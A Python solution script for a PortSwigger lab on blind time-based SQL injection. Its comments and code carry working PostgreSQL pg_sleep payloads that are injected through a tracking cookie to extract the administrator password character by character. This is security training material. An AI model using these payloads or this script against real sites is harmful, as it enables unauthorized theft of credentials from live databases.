# This is a simple Python program created to solve the following lab:
# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

# The database type can be confirmed to be PostgreSQL by using the following Postgres specific syntax to perform a blind time based SQL injection:
# abc'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

# After identifying the database, the following blind time based SQL injection can be used to check whether the first letter of the administrators password is equal to the letter a:
# '%3B+SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1)+=+'a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

# The Python program below attempts to discover the administrators password by modifying the above payload after every HTTP request.
# The following two parts of the above payload are modified:
# 1. Position used in the SUBSTRING function (position 1 is the first character in the administrators password, 2 is second character, etc).
# 2. Character being checked.

# Assumptions Made:
# In writing this program I've made some general assumptions:
# Passwords used in PortSwigger Labs are 20 characters long.
# These passwords only contain lowercase characters and numbers.


import time
import requests

SCHEME = "HTTPS://"
URL = "web-security-academy.net"
PATH = "/login"
SUB_DOMAIN = "0ac2001904e3584780a8c64200240007" # Change This Line With Labs Subdomain
FULL_PATH = SCHEME + SUB_DOMAIN + "." + URL + PATH
PASSWORD_LENGTH = 20
SECONDS = 5
NUMS_AND_LOW_ALPHA = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
    'a', 'b', 'c', 'd', 'e', 'f', 'g',
    'h', 'i', 'j', 'k', 'l', 'm', 'n',
    'o', 'p', 'q', 'r', 's', 't', 'u',
    'v', 'w', 'x', 'y', 'z'
]

print("Program has started...")
print(f"Targetted URL: {FULL_PATH}")
print(f"Assumed password length: {PASSWORD_LENGTH}")

password = ""

for i in range(1, PASSWORD_LENGTH + 1):
    for char in NUMS_AND_LOW_ALPHA:
        print(f"Checking for character --{char}-- in position --{i}-- of administrators password...")
        blind_sqli_timed_payload = f"'%3B+SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username+=+'administrator'),{i},1)+=+'{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--"
        headers = {"Cookie" : "TrackingId=xyz" + blind_sqli_timed_payload}
        start_time = time.time()
        response = requests.get(FULL_PATH, headers=headers)
        end_time = time.time()
        if response.status_code != 200:
            exit(f"Uh-oh, status code {response.status_code}, something went wrong while making request to {FULL_PATH}.")
        if end_time - start_time > 5:
            password = f"{password}{char}"
            print(f"Possible password character matched: POSITION - {i}, CHARACTER - {char}")
            print(f"Password so far: {password}")
            break

print(f"Program finished running, possible password is {password}")
